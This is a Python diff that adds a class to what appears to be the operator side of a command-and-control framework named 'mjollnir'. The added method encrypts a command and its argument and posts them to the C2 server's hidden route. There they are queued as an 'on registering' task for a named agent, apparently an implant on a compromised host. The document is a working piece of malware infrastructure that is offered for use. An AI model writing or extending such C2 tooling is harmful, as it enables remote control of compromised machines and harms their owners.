@@ -72,3 +72,28 @@ class Task():
 				
 		return True
 
+class OnRegisteringTask():
+	def __init__(self, config, session, misc):
+		self.config = config
+		self.s = session
+		self.misc = misc
+
+	def create_registering_task(self, agent_name, cmd_request, cmd_arg):
+		# POST mjollir_url/hidden_route/registering_task/agent_name
+		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
+		endpoint = self.config["endpoints"]["registering_task"] + "/" + agent_name
+		data = {}
+		data["cmd_request"] = cmd_request
+		data["cmd_arg"] = cmd_arg
+
+		data = json.dumps(data)
+		#print(data)
+
+		data = self.misc.encrypt(data)
+		r = self.s.post(url+endpoint, data=data)
+		if r.status_code == 200:
+			#print(self.misc.decrypt(r.content))
+			return self.misc.decrypt(r.content)
+		else:
+			print("[-] Cannot create the 'on registering task' for the agent name: " + agent_name)
+			return self.misc.decrypt(r.content)
